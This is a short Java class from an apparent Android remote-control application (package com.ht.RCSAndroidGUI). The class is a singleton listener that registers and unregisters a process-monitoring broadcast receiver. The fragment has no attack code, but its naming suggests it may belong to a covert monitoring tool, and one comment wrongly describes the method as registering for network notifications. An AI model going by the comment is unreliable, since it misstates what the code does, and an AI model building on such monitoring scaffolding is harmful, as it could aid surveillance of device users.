package com.ht.RCSAndroidGUI.listener;

import com.ht.RCSAndroidGUI.Process;

public class ListenerProcess extends Listener<Process> {
	/** The Constant TAG. */
	private static final String TAG = "ListenerProcess";

	private BroadcastMonitorProcess processReceiver;

	/** The singleton. */
	private volatile static ListenerProcess singleton;

	/**
	 * Self.
	 * 
	 * @return the status
	 */
	public static ListenerProcess self() {
		if (singleton == null) {
			synchronized (ListenerProcess.class) {
				if (singleton == null) {
					singleton = new ListenerProcess();
				}
			}
		}

		return singleton;
	}

	@Override
	protected void start() {
		registerProcess();
	}

	@Override
	protected void stop() {
		processReceiver.unregister();
	}

	/**
	 * Register to Network Connection/Disconnection notification.
	 */
	private void registerProcess() {
		processReceiver = new BroadcastMonitorProcess();
		processReceiver.start();
		processReceiver.register();
	}
}
